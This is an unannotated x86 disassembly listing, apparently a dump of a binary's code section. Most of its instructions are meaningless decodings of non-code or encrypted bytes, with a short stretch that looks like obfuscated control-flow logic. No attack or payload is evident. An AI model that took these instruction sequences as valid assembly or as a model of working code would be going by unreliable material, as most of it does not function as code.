  40c6c9:	mov    DWORD PTR [ebx+0x3b],edi
  40c6cc:	push   esp
  40c6cd:	adc    eax,0x269070d0
  40c6d2:	sar    ecx,1
  40c6d4:	jbe    0x40c65a
  40c6d6:	jno    0x40c6e7
  40c6d8:	jge    0x40c680
  40c6da:	mov    dh,0xbf
  40c6dc:	or     al,0xe8
  40c6de:	mov    bl,0xef
  40c6e0:	fcmovnu st,st(3)
  40c6e2:	cmp    BYTE PTR [ecx-0x52],cl
  40c6e5:	aaa    
  40c6e6:	(bad)  
  40c6e8:	clc    
  40c6e9:	js     0x40c67f
  40c6eb:	data16 or al,0x5a
  40c6ee:	or     DWORD PTR [ebx-0x23adbb0d],esi
  40c6f4:	push   ecx
  40c6f5:	ret    0x15b8
  40c6f8:	push   ebx
  40c6f9:	lds    edx,FWORD PTR [eax+0x33]
  40c6fc:	mov    dl,0x37
  40c6fe:	inc    ebp
  40c6ff:	enter  0xb6e3,0x6
  40c703:	push   0xffffff94
  40c705:	mov    esi,0xed78876d
  40c70a:	nop
  40c70b:	and    esp,DWORD PTR [ebp-0x40fd383]
  40c711:	adc    ebx,esp
  40c713:	sbb    al,0x1c
  40c715:	jp     0x40c76b
  40c717:	sub    eax,0xfa9618ad
  40c71c:	pop    ecx
  40c71d:	stos   BYTE PTR es:[edi],al
  40c71e:	xor    ch,BYTE PTR [ebx]
  40c720:	call   0x1c22:0xd076ee51
  40c727:	mov    edx,0x17dcd
  40c72c:	mov    ds:0xd8d25033,al
  40c731:	daa    
  40c732:	imul   edx,eax,0xc2b48e7f
  40c738:	or     eax,0x7c87db1b
  40c73d:	cmp    ah,dh
  40c73f:	addr16 dec edx
  40c741:	mov    al,0xae
  40c743:	std    
  40c744:	cmp    DWORD PTR [ebx+0x18076dd0],edx
  40c74a:	icebp  
  40c74b:	rcr    BYTE PTR [edx+0x2a747729],1
  40c751:	out    dx,al
  40c752:	or     ecx,DWORD PTR [eax+0x1ce4f33e]
  40c758:	xor    eax,0xf006aa6f
  40c75d:	mov    al,ds:0x11057887
  40c762:	daa    
  40c763:	popf   
  40c764:	dec    ebp
  40c765:	and    dl,0x17
  40c768:	adc    al,0x24
  40c76a:	bound  ecx,QWORD PTR [esp+ebp*4+0x1e37701]
  40c771:	inc    ebp
  40c772:	repnz scas eax,DWORD PTR es:[edi]
  40c774:	je     0x40c72b
  40c776:	loop   0x40c7a2
  40c778:	test   edi,edx
  40c77a:	out    0xe8,al
  40c77c:	add    BYTE PTR [esi],dh
  40c77e:	push   ds
  40c77f:	arpl   WORD PTR [ebx],ax
  40c781:	ror    ebx,cl
  40c783:	ror    BYTE PTR [esi+0x6852033a],cl
  40c789:	dec    ecx
  40c78a:	inc    ebp
  40c78b:	aam    0x54
  40c78d:	in     al,dx
  40c78e:	sub    eax,0x422b94b
  40c793:	jmp    0x40c7f4
  40c795:	xchg   BYTE PTR [esi],dh
  40c797:	not    BYTE PTR [edi]
  40c799:	push   ecx
  40c79a:	mov    eax,0x98fd65e6
  40c79f:	mov    esp,0xe6901ee1
  40c7a4:	repnz leave 
  40c7a6:	mov    esp,0x510468b6
  40c7ab:	pop    ds
  40c7ac:	mov    ch,0xa6
  40c7ae:	pop    edi
  40c7af:	push   es
  40c7b0:	and    DWORD PTR [edi],0x5b
  40c7b3:	call   0x1a633db8
  40c7b8:	xchg   esp,eax
  40c7b9:	retf   0x833c
  40c7bc:	or     eax,0xd6ab2a1c
  40c7c1:	xchg   ebp,ebx
  40c7c3:	cmp    eax,0x457f48d0
  40c7c8:	mov    ebx,0x5a2728c6
  40c7cd:	add    edx,ebx
  40c7cf:	add    eax,0x10c183b1
  40c7d4:	jne    0x40c835
  40c7d6:	sbb    ecx,DWORD PTR [esi-0x3df08a67]
  40c7dc:	push   cs
  40c7dd:	cmp    ebp,DWORD PTR [ebp+0x8]
  40c7e0:	mov    esi,0xec674a62
  40c7e5:	fs cmp esp,edx
  40c7e8:	jbe    0x40c7e5
  40c7ea:	adc    eax,0x24a4b3e6
  40c7ef:	dec    esi
  40c7f0:	lods   eax,DWORD PTR ds:[esi]
  40c7f1:	lahf   
  40c7f2:	add    ecx,DWORD PTR [esp+esi*4+0x6a477aee]
  40c7f9:	sti    
  40c7fa:	jns    0x40c80b
  40c7fc:	or     BYTE PTR [ecx-0x55],bh
  40c7ff:	pop    ds
  40c800:	fdivp  st(0),st
  40c802:	sub    eax,DWORD PTR [eax-0x45e63fb7]
  40c808:	push   eax
  40c809:	and    DWORD PTR [esi+edi*8-0x24],edi
  40c80d:	fs jp  0x40c7da
  40c810:	clc    
  40c811:	cli    
  40c812:	int3   
  40c813:	daa    
  40c814:	inc    ecx
  40c815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c816:	xor    al,0x74
  40c818:	mov    ebx,0x5f80284f
  40c81d:	stc    
  40c81e:	ret    0xc84c
  40c821:	or     ecx,ebp
  40c823:	outs   dx,DWORD PTR ds:[esi]
  40c824:	or     al,0xf8
  40c826:	fistp  WORD PTR [esi]
  40c828:	ss mov dh,0x75
  40c82b:	push   ss
  40c82c:	push   eax
  40c82d:	sub    dh,BYTE PTR [edi-0x40b5fbb3]
  40c833:	dec    ebp
  40c834:	and    DWORD PTR [esi+0x2a1b0b86],edx
  40c83a:	pop    ecx
  40c83b:	pop    ebp
  40c83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c83d:	test   eax,0xff2cca91
  40c842:	ins    BYTE PTR es:[edi],dx
  40c843:	inc    edi
  40c844:	sub    BYTE PTR ds:0x9eeee98c,0xaa
  40c84b:	fisub  DWORD PTR [esp+edi*4]
  40c84e:	jmp    0xdd41:0xd3e27320
  40c855:	mov    ah,cl
  40c857:	and    al,0x74
  40c859:	sbb    BYTE PTR [edi+0x34],cl
  40c85c:	jb     0x40c808
  40c85e:	pusha  
  40c85f:	fs or  eax,0xa43b56bb
  40c865:	cs out 0x5b,eax
  40c868:	mov    ch,0x89
  40c86a:	xor    eax,0x6e305ad4
  40c86f:	bound  ebx,QWORD PTR [eax]
  40c871:	inc    edx
  40c872:	push   ds
  40c873:	pop    es
  40c874:	sbb    al,0xaf
  40c876:	popa   
  40c877:	scas   eax,DWORD PTR es:[edi]
  40c878:	cmp    BYTE PTR [edi-0x2ce609b2],dl
  40c87e:	mov    dh,0x20
  40c880:	jae    0x40c81f
  40c882:	xchg   ebp,eax
  40c883:	fisub  DWORD PTR [edx-0x11]
  40c886:	mov    ds:0x255b1da9,eax
  40c88b:	pushf  
  40c88c:	call   0xe9551c97
  40c891:	mov    dl,0x3e
  40c893:	rcl    BYTE PTR [edx+0x3b235ae7],0xa2
  40c89a:	shl    BYTE PTR [eax],1
  40c89c:	scas   al,BYTE PTR es:[edi]
  40c89d:	ss push ss
  40c89f:	pop    ds
  40c8a0:	div    DWORD PTR [ecx]
  40c8a2:	dec    esp
  40c8a3:	jl     0x40c8ad
  40c8a5:	or     ch,al
  40c8a7:	ret    0xc6c1
  40c8aa:	add    eax,0xf8b69c7e
  40c8af:	add    eax,0x3b6eae8d
  40c8b4:	jo     0x40c8c8
  40c8b6:	mov    eax,fs
  40c8b8:	push   es
  40c8b9:	and    bh,bh
  40c8bb:	test   DWORD PTR [ebx-0x2cac5946],edi
  40c8c1:	adc    ecx,0xffffffa4
  40c8c4:	inc    ebp
  40c8c5:	sub    BYTE PTR [ecx+0x46],bh
  40c8c8:	loope  0x40c945
  40c8ca:	ja     0x40c938
  40c8cc:	jge    0x40c92c
  40c8ce:	sbb    al,0xbd
  40c8d0:	add    eax,0xac5b85a1
  40c8d5:	pop    esi
  40c8d6:	push   ebx
  40c8d7:	add    ch,BYTE PTR [ebx]
  40c8d9:	cli    
  40c8da:	cmp    al,0x0
  40c8dc:	repnz aas 
  40c8de:	mov    ebp,0x5acd33c9
  40c8e3:	adc    eax,DWORD PTR [ecx+0x6761442d]
  40c8e9:	or     ebx,eax
  40c8eb:	cld    
  40c8ec:	mov    dl,0xaa
  40c8ee:	sar    DWORD PTR ds:0x1329904a,1
  40c8f4:	idiv   BYTE PTR [ecx+0x37735509]
  40c8fa:	lods   eax,DWORD PTR ds:[esi]
  40c8fb:	add    bh,BYTE PTR [esp+ebx*8+0x1464b18b]
  40c902:	(bad)  
  40c903:	in     al,0x5e
  40c905:	cmc    
  40c906:	jb     0x40c8fc
  40c908:	xchg   ebx,eax
  40c909:	(bad)  
  40c90a:	mov    ecx,0x8d00d278
  40c90f:	lods   al,BYTE PTR ds:[esi]
  40c910:	or     eax,0xc3b39ba0
  40c915:	arpl   WORD PTR [ebp+0x7d],ax
  40c918:	xchg   edi,eax
  40c919:	out    dx,eax
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x274c5e53
  40c96a:	add    eax,edi
  40c96c:	sub    DWORD PTR [edx],esi
  40c96e:	popf   
  40c96f:	js     0x40c9e9
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	sti    
  40c976:	int    0xb3
  40c978:	hlt    
  40c979:	lock dec esi
  40c97b:	dec    esi
  40c97c:	push   0xffffffb1
  40c97e:	push   ecx
  40c97f:	nop
  40c980:	xor    ebx,DWORD PTR [esi]
  40c982:	pop    esi
  40c983:	pop    esi
  40c984:	pop    es
  40c985:	jle    0x40c9ba
  40c987:	push   eax
  40c988:	dec    ebx
  40c989:	aas    
  40c98a:	leave  
  40c98b:	xlat   BYTE PTR ds:[ebx]
  40c98c:	add    ch,BYTE PTR ds:0xca997988
  40c992:	hlt    
  40c993:	push   ss
  40c994:	push   edx
  40c995:	jg     0x40c974
  40c997:	rcr    dl,1
  40c999:	adc    esi,ebx
  40c99b:	pop    edx
  40c99c:	aam    0xe3
  40c99e:	fwait
  40c99f:	jmp    0x40c921
  40c9a1:	mov    edx,0x8ae05785
  40c9a6:	pop    edi
  40c9a7:	xor    al,bl
  40c9a9:	mov    al,ds:0x234d4ab5
  40c9ae:	jge    0x40c9a0
  40c9b0:	scas   eax,DWORD PTR es:[edi]
  40c9b1:	xchg   esi,eax
  40c9b2:	pop    ebp
  40c9b3:	fs dec ebp
  40c9b5:	xchg   esp,eax
  40c9b6:	sub    BYTE PTR [esi+0x27],cl
  40c9b9:	mov    esi,0x724a26dc
  40c9be:	fnstenv ds:0xa3272aa6
  40c9c4:	add    eax,0x196bef41
  40c9c9:	dec    ebp
  40c9ca:	xlat   BYTE PTR ds:[ebx]
  40c9cb:	bound  edi,QWORD PTR [ebx]
  40c9cd:	pop    esi
  40c9ce:	add    edi,DWORD PTR [edx]
  40c9d0:	jmp    0x40ca41
  40c9d2:	mov    bh,0xa9
  40c9d4:	jecxz  0x40c97f
  40c9d6:	(bad)  
  40c9d7:	les    edx,FWORD PTR [eax-0xa]
  40c9da:	and    BYTE PTR [ebp-0xe],ah
  40c9dd:	sar    ecx,0x59
  40c9e0:	push   ecx
  40c9e1:	push   0xf1f303a
  40c9e6:	imul   edx,DWORD PTR [ecx+0x5ccf4bf6],0x888019c1
  40c9f0:	sub    bl,BYTE PTR ss:[eax-0x11]
  40c9f4:	jns    0x40c97b
  40c9f6:	cmp    eax,0x7148fbff
  40c9fb:	or     BYTE PTR [ecx+0x23],dh
  40c9fe:	cmp    DWORD PTR [ecx-0x39],edx
  40ca01:	sub    ebp,DWORD PTR [eax+0x45db124a]
  40ca07:	or     eax,0x422cc351
  40ca0c:	fwait
  40ca0d:	jl     0x40ca8b
  40ca0f:	hlt    
  40ca10:	into   
  40ca11:	lods   eax,DWORD PTR ds:[esi]
  40ca12:	xor    al,0xc7
  40ca14:	mov    ecx,0x4fe2eed2
  40ca19:	push   0xffffffd3
  40ca1b:	stc    
  40ca1c:	xchg   esi,eax
  40ca1d:	into   
  40ca1e:	push   esi
  40ca1f:	mov    ds:0xc0ded8b7,al
  40ca24:	imul   DWORD PTR [eax+ebp*1]
  40ca27:	jnp    0x40c9cf
  40ca29:	test   DWORD PTR [eax+ebx*4+0x5d],esp
  40ca2d:	adc    esp,edi
  40ca2f:	sar    DWORD PTR [ebx],cl
  40ca31:	inc    ecx
  40ca32:	or     eax,0xe0d720d1
  40ca37:	adc    BYTE PTR [ecx-0x46],0xc7
  40ca3b:	push   ss
  40ca3c:	pop    es
  40ca3d:	mov    bh,0x49
  40ca3f:	xor    BYTE PTR [ebp+edi*1-0x72],ch
  40ca43:	pop    eax
  40ca44:	outs   dx,BYTE PTR ds:[esi]
  40ca45:	out    0xea,al
  40ca47:	sub    DWORD PTR [esp+ebp*8-0xa],0x44
  40ca4c:	sbb    bh,cl
  40ca4e:	mov    esp,0x23385fc1
  40ca53:	push   ebp
  40ca54:	adc    al,0xf5
  40ca56:	adc    DWORD PTR [edx],esp
  40ca58:	fstp   QWORD PTR [edi+0x62]
  40ca5b:	mov    ebp,0xf5c96e2d
  40ca60:	nop
  40ca61:	cmp    eax,0xc74e6b31
  40ca66:	push   eax
  40ca67:	mov    BYTE PTR [edx],ah
  40ca69:	and    BYTE PTR [ebp+0x42],al
  40ca6c:	dec    esp
  40ca6d:	cmp    BYTE PTR [esi],dh
  40ca6f:	pop    ss
  40ca70:	sub    edi,edx
  40ca72:	adc    BYTE PTR [edi+0x8812346],dh
  40ca78:	fiadd  DWORD PTR [esi+edi*4-0x6c3d2cea]
  40ca7f:	retf   0x9470
  40ca82:	ret    
  40ca83:	adc    dl,BYTE PTR gs:[ecx]
  40ca86:	mov    eax,ds:0x5b4f8b7
  40ca8b:	pop    eax
  40ca8c:	and    dl,BYTE PTR [edx-0x30]
  40ca8f:	gs push ecx
  40ca91:	iret   
  40ca92:	or     BYTE PTR ds:0xc3970e00,al
  40ca98:	into   
  40ca99:	std    
  40ca9a:	sbb    eax,0x3e8759be
  40ca9f:	(bad)  
  40caa0:	(bad)  
  40caa1:	in     eax,0x4c
  40caa3:	pop    ecx
  40caa4:	pop    ebx
  40caa5:	jnp    0x40ca3c
  40caa7:	xchg   esp,eax
  40caa8:	nop
  40caa9:	jmp    0x40cace
  40caab:	pop    es
  40caac:	jo     0x40cae8
  40caae:	les    esi,FWORD PTR [edi]
  40cab0:	dec    ecx
  40cab1:	mov    esp,0x44d659f2
  40cab6:	aas    
  40cab7:	mov    DWORD PTR [esi+0x15],ebp
  40caba:	nop
  40cabb:	cli    
  40cabc:	push   edi
  40cabd:	call   FWORD PTR [ebx]
  40cabf:	ds pop ebx
  40cac1:	(bad)  
  40cac2:	rcl    DWORD PTR [eax],0x3
  40cac5:	dec    edx
  40cac6:	in     eax,dx
  40cac7:	fwait
  40cac8:	loop   0x40ca9d
  40caca:	adc    edi,DWORD PTR [eax-0x4]
  40cacd:	(bad)  
  40cace:	fisub  WORD PTR [edx-0x56fd38c1]
  40cad4:	jbe    0x40ca8d
  40cad6:	jmp    0x6530:0xd68ab8d5
  40cadd:	ins    BYTE PTR es:[edi],dx
  40cade:	add    si,WORD PTR ds:0xe72beb16
  40cae5:	lods   eax,DWORD PTR ds:[esi]
  40cae6:	cdq    
  40cae7:	pop    ecx
  40cae8:	mov    esp,0x6b4417b8
  40caed:	test   DWORD PTR [ebx],esi
  40caef:	dec    ebx
  40caf0:	push   esp
  40caf1:	adc    DWORD PTR [edi+0x50061fc7],0x45
  40caf8:	inc    edx
  40caf9:	push   ds
  40cafa:	icebp  
  40cafb:	aas    
  40cafc:	dec    esi
  40cafd:	inc    esi
  40cafe:	sbb    BYTE PTR [esi],dh
  40cb00:	and    edx,DWORD PTR [esi+0x972cf87]
  40cb06:	fsub   QWORD PTR [ebx+ecx*8-0x40]
  40cb0a:	scas   eax,DWORD PTR es:[edi]
  40cb0b:	mov    esi,DWORD PTR [edi+0xf1f278a]
  40cb11:	dec    ebp
  40cb12:	into   
  40cb13:	push   edi
  40cb14:	sbb    dl,cl
  40cb16:	sbb    al,BYTE PTR [esi-0x4e]
  40cb19:	jge    0x40cb98
  40cb1b:	rcr    DWORD PTR [ebx*2+0x73cd4acd],cl
  40cb22:	mov    ebx,0x7b8b68b1
  40cb27:	inc    edx
  40cb28:	test   DWORD PTR [esp+edx*8],edi
  40cb2b:	add    eax,0x9e8752c2
  40cb30:	push   0x7f016fb6
  40cb35:	add    DWORD PTR [edi-0x13365755],esp
  40cb3b:	(bad)  
  40cb3c:	popa   
  40cb3d:	int3   
  40cb3e:	cmp    eax,0xf4f2f247
  40cb43:	inc    ecx
  40cb44:	adc    eax,0xe541418e
  40cb49:	xor    al,0x2e
  40cb4b:	sub    cl,bl
  40cb4d:	mov    ds:0x98d7af39,eax
  40cb52:	lods   al,BYTE PTR ds:[esi]
  40cb53:	xor    edx,eax
  40cb55:	enter  0x4003,0xa8
  40cb59:	imul   esp,edx,0x35
  40cb5c:	je     0x40cb63
  40cb5e:	stc    
  40cb5f:	mov    esp,eax
  40cb61:	cmp    BYTE PTR [eiz*1+0x356d610c],dl
  40cb68:	jmp    0x40caea
  40cb6a:	(bad)  [edi+0x10]
  40cb6d:	shr    BYTE PTR [esi+esi*2+0x40c9a3fb],0x1a
  40cb75:	xchg   esp,eax
  40cb76:	mov    bh,ch
  40cb78:	faddp  st(7),st
  40cb7a:	jg     0x40cbc4
  40cb7c:	repz or cl,cl
  40cb7f:	and    dh,al
  40cb81:	pop    esp
  40cb82:	push   esp
  40cb83:	add    ebx,ebx
  40cb85:	imul   ebx,DWORD PTR [edi-0x1e],0x4
  40cb89:	jnp    0x40cb1c
  40cb8b:	test   eax,0x5cb5cfb9
  40cb90:	in     al,0xe5
  40cb92:	jg     0x40cb20
  40cb94:	jb     0x40cb9e
  40cb96:	xor    bl,al
  40cb98:	js     0x40cbbd
  40cb9a:	cmp    cl,bl
  40cb9c:	mov    al,ds:0xd85082ec
  40cba1:	or     al,0x40
  40cba3:	push   0x69
  40cba5:	sub    al,0xfe
  40cba7:	aas    
  40cba8:	jl     0x40cb2f
  40cbaa:	xor    eax,0xc9a44d4e
  40cbaf:	mov    ?,edx
  40cbb1:	icebp  
  40cbb2:	ins    BYTE PTR es:[edi],dx
  40cbb3:	dec    eax
  40cbb4:	push   ebx
  40cbb5:	hlt    
  40cbb6:	mov    edx,0xef1f6ac8
  40cbbb:	cmp    eax,0x2ef8483b
  40cbc0:	popa   
  40cbc1:	test   eax,0xb205a3e4
  40cbc6:	and    dl,BYTE PTR [edx]
  40cbc8:	jbe    0x40cbf9
  40cbca:	cmp    bl,BYTE PTR [ebx+0x52]
  40cbcd:	fisttp QWORD PTR [ebp-0x6f1273d4]
  40cbd3:	and    DWORD PTR [edx+0x527b3e1c],0x2e1a13e9
  40cbdd:	add    BYTE PTR [ebx],al
  40cbdf:	aad    0x7c
  40cbe1:	dec    esi
  40cbe2:	mov    bh,BYTE PTR [ebp+0x5e5fa31f]
  40cbe8:	shr    edi,1
  40cbea:	bound  ecx,QWORD PTR [edx-0x13]
  40cbed:	(bad)  
  40cbee:	cmp    eax,0x4f174b65
  40cbf3:	daa    
  40cbf4:	and    DWORD PTR [ebx-0x4d547531],0x39
  40cbfb:	xor    ecx,DWORD PTR [ecx-0x11370f81]
  40cc01:	jmp    0x5a6abf14
  40cc06:	adc    edx,DWORD PTR [edi+0x18b18f4b]
  40cc0c:	xchg   ebp,eax
  40cc0d:	(bad)  
  40cc0e:	hlt    
  40cc0f:	sub    DWORD PTR [ecx+0x71e90b8c],edi
  40cc15:	inc    eax
  40cc16:	jno    0x40cbbf
  40cc18:	pushfw 
  40cc1a:	(bad)  
  40cc1b:	js     0x40cc2c
  40cc1d:	imul   esi,DWORD PTR [ecx+ebp*4],0xffffff88
  40cc21:	push   edx
  40cc22:	push   ecx
  40cc23:	cmp    eax,0xf491fdd6
  40cc28:	rcl    BYTE PTR [ecx+0xd],0xec
  40cc2c:	fcomp  QWORD PTR ss:[ecx]
  40cc2f:	xchg   ecx,eax
  40cc30:	pop    ebp
  40cc31:	les    ebp,FWORD PTR [ecx+0x38f75da7]
  40cc37:	pop    ecx
  40cc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc39:	repz data16 aas 
  40cc3c:	cdq    
  40cc3d:	pusha  
  40cc3e:	cdq    
  40cc3f:	jge    0x40cc57
  40cc41:	pop    ss
  40cc42:	std    
  40cc43:	pop    esp
  40cc44:	push   edx
  40cc45:	and    ecx,DWORD PTR [eax+edx*8]
  40cc48:	imul   DWORD PTR [ebx-0x4b99fa59]
  40cc4e:	cli    
  40cc4f:	(bad)  
  40cc50:	adc    edi,edi
  40cc52:	pop    edi
  40cc53:	arpl   WORD PTR [edx],sp
  40cc55:	mov    dl,0x50
  40cc57:	push   ecx
  40cc58:	mov    ebp,0x6906c33f
  40cc5d:	add    dl,dh
  40cc5f:	cs add esi,ebp
  40cc62:	stc    
  40cc63:	jl     0x40cc50
  40cc65:	and    al,0x27
  40cc67:	push   esp
  40cc68:	push   ss
  40cc69:	xchg   ebx,eax
  40cc6a:	test   al,0xaf
  40cc6c:	pushf  
  40cc6d:	jmp    0x39849993
  40cc72:	cmp    cl,ch
  40cc74:	adc    al,0x3
  40cc76:	add    BYTE PTR [eax],al
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x26
  40cc85:	in     al,0x50
  40cc87:	add    BYTE PTR [esi],ch
  40cc89:	mov    ds:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	int3   
  40cc91:	dec    bh
  40cc93:	add    al,BYTE PTR [ecx+0xbc827fd]
  40cc99:	adc    eax,0xb5e2ff3c
  40cc9e:	hlt    
  40cc9f:	mov    eax,ds:0x1b017646
  40cca4:	stos   BYTE PTR es:[edi],al
  40cca5:	mov    al,ds:0xb9c95a00
  40ccaa:	pop    es
  40ccab:	dec    ebp
  40ccac:	int    0x1
  40ccae:	fldcw  WORD PTR [edx+0x58140bb1]
  40ccb4:	sbb    BYTE PTR [ebp-0x638e6aa],0x9d
  40ccbb:	jbe    0x40cccc
  40ccbd:	(bad)  
  40ccbe:	mov    ebp,0x80c63e71
  40ccc3:	or     BYTE PTR [ebx+ebx*4],ah
  40ccc6:	es mov ebx,0x42b784be
  40cccc:	shl    BYTE PTR [esi+0x6b71dd70],1
  40ccd2:	pusha  
  40ccd3:	std    
  40ccd4:	cmp    cl,bl
  40ccd6:	sub    DWORD PTR [bx+si],eax
  40ccd9:	loopne 0x40cc80
  40ccdb:	mov    ebx,0xbc78a0e8
  40cce0:	fstp   DWORD PTR [ecx+0x561c625c]
  40cce6:	cld    
  40cce7:	imul   esi,eax,0xffffff84
  40ccea:	(bad)  
  40cceb:	fidiv  DWORD PTR [ecx]
  40cced:	mov    ebp,0xad857037
  40ccf2:	add    eax,0x4c59dcbe
  40ccf7:	or     edi,DWORD PTR [edi-0x42]
  40ccfa:	jl     0x40cc80
  40ccfc:	mov    al,0xa
  40ccfe:	sub    ah,BYTE PTR [ebp+0x2b]
  40cd01:	nop
  40cd02:	pusha  
  40cd03:	push   es
  40cd04:	jbe    0x40ccb1
  40cd06:	inc    edi
  40cd07:	jno    0x40ccca
  40cd09:	adc    edx,DWORD PTR [edi]
  40cd0b:	test   al,0x8b
  40cd0d:	dec    eax
  40cd0e:	fst    QWORD PTR [edi-0x2751a51b]
  40cd14:	push   ebp
  40cd15:	ret    
  40cd16:	test   al,0x69
  40cd18:	mov    WORD PTR [esi],?
  40cd1a:	fldcw  WORD PTR [eax]
  40cd1c:	mov    al,0xf5
  40cd1e:	pop    ss
  40cd1f:	mov    dl,0x0
  40cd21:	clc    
  40cd22:	adc    al,0xae
  40cd24:	or     eax,0xacdffe81
  40cd29:	out    0x92,al
  40cd2b:	jmp    0x40cd4c
  40cd2d:	jle    0x40cd71
  40cd2f:	mov    BYTE PTR [edi+0x7c],ch
  40cd32:	enter  0xe90c,0x26
  40cd36:	mov    ds:0x79ad5c13,eax
  40cd3b:	stos   BYTE PTR es:[edi],al
  40cd3c:	and    DWORD PTR [ecx*2-0x54d2e4e0],0xb075c842
  40cd47:	push   ebx
  40cd48:	ror    BYTE PTR [edi],cl
  40cd4a:	hlt    
  40cd4b:	push   ecx
  40cd4c:	ret    
  40cd4d:	sbb    DWORD PTR [ecx],0x67e08754
  40cd53:	fnsave [edx-0x7f]
  40cd56:	mov    bh,0x1c
  40cd58:	outs   dx,DWORD PTR ds:[esi]
  40cd59:	xchg   DWORD PTR [ebp-0x135c7b8b],edi
  40cd5f:	or     BYTE PTR [edi+esi*8-0x3cf369a0],0x79
  40cd67:	jmp    0xf1fa:0x2b7c0337
  40cd6e:	jmp    0x9789:0x514a754b
  40cd75:	inc    edx
  40cd76:	bound  eax,QWORD PTR [esi-0x3a577ee6]
  40cd7c:	popf   
  40cd7d:	int    0x81
  40cd7f:	xor    BYTE PTR [ebp+0x18],ch
  40cd82:	jmp    0xf2bd77a4
  40cd87:	scas   eax,DWORD PTR es:[edi]
  40cd88:	inc    edx
  40cd89:	mov    ebx,0xa6425eb6
  40cd8e:	sub    edx,ecx
  40cd90:	xchg   ebx,eax
  40cd91:	aaa    
  40cd92:	call   0x9784:0x90be7962
  40cd99:	test   edx,ecx
  40cd9b:	xchg   ebp,eax
  40cd9c:	outs   dx,BYTE PTR ds:[esi]
  40cd9d:	add    eax,0xff2c3044
  40cda2:	and    DWORD PTR [ecx-0x6e],esp
  40cda5:	bound  edi,QWORD PTR [edi]
  40cda7:	dec    ebx
  40cda8:	adc    bl,BYTE PTR [ebx]
  40cdaa:	add    eax,0x11cf7a95
  40cdaf:	xchg   ebx,eax
  40cdb0:	lods   al,BYTE PTR ds:[esi]
  40cdb1:	call   0x3e4d208a
  40cdb6:	ror    DWORD PTR [edx-0x47],0x0
  40cdba:	call   0xfff8:0x3b64de73
  40cdc1:	sbb    al,0xb3
  40cdc3:	pop    ebp
  40cdc4:	fcmovu st,st(1)
  40cdc6:	xchg   ecx,eax
  40cdc7:	fwait
  40cdc8:	rep stos BYTE PTR es:[edi],al
  40cdca:	jno    0x40cd6b
  40cdcc:	(bad)  
  40cdcd:	test   dl,dl
  40cdcf:	aam    0x40
  40cdd1:	out    0xc9,al
  40cdd3:	(bad)  
  40cdd4:	sti    
  40cdd5:	pop    edi
  40cdd6:	fimul  WORD PTR [eax+eax*1]
  40cdd9:	xchg   BYTE PTR [esi+0x40],bl
  40cddc:	nop
  40cddd:	out    0x3,al
  40cddf:	push   esi
  40cde0:	or     BYTE PTR [ebx-0x77],cl
  40cde3:	scas   eax,DWORD PTR es:[edi]
  40cde4:	pop    es
  40cde5:	mov    cl,0x1f
  40cde7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cde8:	xor    eax,0xc9c3571e
  40cded:	inc    ebx
  40cdee:	cmp    eax,0xbb05fbad
  40cdf3:	pop    ebx
  40cdf4:	loop   0x40ce43
  40cdf6:	mov    eax,0x4af54681
  40cdfb:	into   
  40cdfc:	jp     0x40ce28
  40cdfe:	xchg   BYTE PTR [edx],cl
  40ce00:	enter  0x6dda,0x26
  40ce04:	dec    esi
  40ce05:	cmp    edx,DWORD PTR [ebx+0x33]
  40ce08:	fwait
  40ce09:	add    bl,bl
  40ce0b:	cmp    edx,esp
  40ce0d:	out    dx,al
  40ce0e:	mov    ebx,0x38c2633
  40ce13:	push   ds
  40ce14:	neg    BYTE PTR [edi]
  40ce16:	stos   BYTE PTR es:[edi],al
  40ce17:	jnp    0x40ce94
  40ce19:	sbb    eax,0x94092920
  40ce1e:	sub    eax,0xe93f42de
  40ce23:	cdq    
  40ce24:	dec    ebp
  40ce25:	aad    0x44
  40ce27:	mov    BYTE PTR [ecx+0x4e],bl
  40ce2a:	adc    al,0x10
  40ce2c:	and    BYTE PTR [esi+0x749ec127],dl
  40ce32:	pop    eax
  40ce33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce34:	daa    
  40ce35:	icebp  
  40ce36:	xchg   ecx,eax
  40ce37:	repz lock mov bh,0x4e
  40ce3b:	popf   
  40ce3c:	add    eax,0x8e09a8ed
  40ce41:	inc    esp
  40ce42:	cmp    dl,BYTE PTR [edi+0x487acfbe]
  40ce48:	and    eax,0xeed7aa62
  40ce4d:	push   esi
  40ce4e:	(bad)  
  40ce50:	cmp    al,0x4e
  40ce52:	pop    ds
  40ce53:	ror    BYTE PTR [ebp-0x2d],0x62
  40ce57:	sbb    al,0xbd
  40ce59:	call   0x3cba0cc8
  40ce5e:	int3   
  40ce5f:	popf   
  40ce60:	pop    esp
  40ce61:	lahf   
  40ce62:	push   es
  40ce63:	sbb    ch,BYTE PTR [esi]
  40ce65:	out    dx,al
  40ce66:	ror    edx,0xb
  40ce69:	xchg   edi,eax
  40ce6a:	aas    
  40ce6b:	or     DWORD PTR [esi+ecx*8],esp
  40ce6e:	pop    esp
  40ce6f:	daa    
